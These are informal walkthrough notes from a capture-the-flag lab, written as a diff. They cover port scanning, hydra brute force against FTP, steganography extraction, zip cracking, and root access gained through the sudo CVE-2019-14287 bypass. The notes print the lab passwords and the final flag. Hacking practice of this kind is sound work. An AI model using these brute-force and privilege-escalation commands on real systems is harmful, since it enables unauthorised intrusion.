@@ -1,0 +1,70 @@
+first run nmap	
+	nmap -sV -sV -vv -p- 10.10.202.40
+	we see we have 3 ports open
+	lets try to do anonymous on ftp
+		that doesnt seem to work
+Run a directory buster on the site
+	gobuster dir -u 10.10.202.40 -w /usr/share/wordlists/dirb/big.txt -x php,http,txt,zip
+We can see that there is an agent R, lets see if there are other agents
+	curl -A "R" -L 10.10.202.40
+	We can see there are 25 other agents, 26 letters in the alphabet
+	lets start to go through the different ones
+	        curl -A "A" -L 10.10.202.40
+	        curl -A "C" -L 10.10.202.40
+			Agent C gives us a different message
+			Lets go to agent J
+				he doesnt give us any information but we 
+				do know that Agent C has a weak password
+		Since we know his password is weak, lets use that against hydra
+		and first try to get the ftp login information
+	hydra -l c -P /usr/share/wordlists/rockyou.txt 10.10.202.40 ftp
+	c as the username didnt show us anything, however, we did figure out his
+	real name is chris
+		hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.202.40 ftp
+	Alright!!! we have a password!!!
+		[21][ftp] host: 10.10.202.40   login: chris   password: crystal
+	lets get all of the ftp files that we found
+		get xxxxxxxx.xxx
+	Go back to terminal and lets see what they say
+	open To_agentJ.txt
+		looks like we have steganography, very exciting
+		binwalk cutie.png 
+			we find a To_agentR.txt file
+			lets go there
+			binwalk -e cutie.png (extracts the file)
+			cd _cutie.png.extracted/
+			ls
+			we now see a zip file that is encrypted (it is in red) and the agentR.txt
+				nothing in the agentr.txt file, lets decrypt the 8702.zip file using john the ripper
+			sudo zip2john 8702.zip > zip.hash
+			sudo john zip.hash
+				we can now see the password for the zip file is alien
+			lets unzip the file, 7z e 8702.zip
+				as we can see it overwrites the agentR.txt file
+				reopen agentR.txt and we can more writing
+			had to look up what type of hash that was, however we can see now that it is a base 64 hash
+				decode it on the internet and we get Area51
+	We still have the cute-alien.jpg file, lets look into that
+		sudo apt-get install steghide (this will allow us to see if anything is hidden within the jpg file that we could not find before)
+			steghide info cute-alien.jpg
+			steghide extract -sf cute-alien.jpg 
+				less message.txt
+	We now have a login for another user, james and his password hackerrules!
+		we already did an FTP, lets do an SSH
+			ssh james@10.10.202.40
+			ls -la
+		user flag.txt file
+		We also see an image, do a reverse lookup on the image using the following command
+			scp james@10.10.202.40:Alien_autospy.jpg /localdir/
+		just search for Alien_autospy.jpg on google with fox news. You will see the rosewill experiment
+now lets do sudo -l for james
+to check version of sudo type sudo -V
+now we can see there is a vulnerability for sudo version 1.8.21p2
+	 	CVE-2019-14287
+		https://nvd.nist.gov/vuln/detail/CVE-2019-14287#:~:text=CVE-2019-14287%20Detail&text=In%20Sudo%20before%201.8.,with%20a%20crafted%20user%20ID.
+			sudo -u \#$((0xffffffff)) /bin/bash
+		Now cd to /root/
+			open root.txt
+		we find the last flag and name
+			b53a02f55b57d4439e3341834d70c062
+			DesKel
